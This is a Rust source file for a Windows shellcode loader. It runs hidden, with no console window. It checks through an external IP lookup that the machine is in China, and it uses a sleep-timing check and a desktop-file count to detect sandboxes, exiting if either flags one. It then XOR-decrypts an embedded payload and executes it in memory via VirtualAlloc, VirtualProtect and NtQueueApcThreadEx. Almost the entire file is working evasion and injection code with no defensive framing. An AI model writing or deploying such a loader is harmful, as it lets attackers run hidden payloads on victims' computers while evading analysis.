#![windows_subsystem = "windows"]
mod forgery;
use std::str;
use std::process::{exit, Command};
use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, HANDLE};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::GetCurrentThread;
use std::os::windows::process::CommandExt;
use winapi::um::winbase::CREATE_NO_WINDOW;

use std::fs;
use std::path::PathBuf;
use std::process;




fn decrypt_with_uuid(data: &[u8], uuid: &uuid::Uuid) -> Vec<u8> {
    let uuid_bytes = uuid.as_bytes();
    let uuid_len = uuid_bytes.len();
    let mut decrypted_data = Vec::new();
    for (i, byte) in data.iter().enumerate() {
        decrypted_data.push(byte ^ uuid_bytes[i % uuid_len]);
    }
    decrypted_data
}

pub fn ft() {
    use std::time::{Duration, Instant};
    use std::thread::sleep;

    let start_time = Instant::now();

    sleep(Duration::from_millis(5000));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 5000 {
        std::process::exit(1);
    }
}


fn ip() {
    let output = Command::new("cmd")
        .args(&["/c", "curl -s https://myip.ipip.net/"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .expect("Failed to execute command");

    if !output.status.success() {
        std::process::exit(1);
    }

    let body = str::from_utf8(&output.stdout).expect("Failed to parse response");

    if body.contains("中国") {
    } else {
        std::process::exit(1);
    }
}

fn cdp() {
    if !check_desktop_files() {
        process::exit(1);
    }
}

fn check_desktop_files() -> bool {
    // 获取桌面路径
    let desktop_path = match get_desktop_path() {
        Some(path) => path,
        None => return false,
    };

    let entries = match fs::read_dir(&desktop_path) {
        Ok(entries) => entries,
        Err(_) => return false,
    };

    let file_count = entries.filter_map(|entry| entry.ok()).count();

    // 检查文件数量是否小于 6
    file_count >= 6
}

fn get_desktop_path() -> Option<PathBuf> {
    let home_dir = dirs::home_dir()?;
    Some(home_dir.join("Desktop"))
}


fn main() {
    ip();
    ft();
    cdp();
    //forgery::bundle::bundlefile();
    let encrypted_data = include_bytes!("encrypt.bin");
    let uuid_bytes = include_bytes!("uuidkey.txt");
    let uuid_str = str::from_utf8(uuid_bytes).expect("Failed to read UUID string");
    let uuid = uuid::Uuid::parse_str(uuid_str.trim()).expect("Invalid UUID string");
    let decrypted_data = decrypt_with_uuid(encrypted_data, &uuid);


    unsafe {
        let shellcode = std::slice::from_raw_parts(decrypted_data.as_ptr(), decrypted_data.len());
        let shellcode_size = shellcode.len();
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            panic!("[-]LoadLibraryA failed: {}!", GetLastError());
        }

        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, b"NtQueueApcThreadEx\0".as_ptr());

        let nt_queue_apc_thread_ex: extern "C" fn(HANDLE, isize, *mut c_void, isize, isize, isize) =
            transmute(fn_nt_queue_apc_thread_ex);

        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let handle = GetCurrentThread();
        if handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        nt_queue_apc_thread_ex(handle, 1, addr, 0, 0, 0);
    }
}
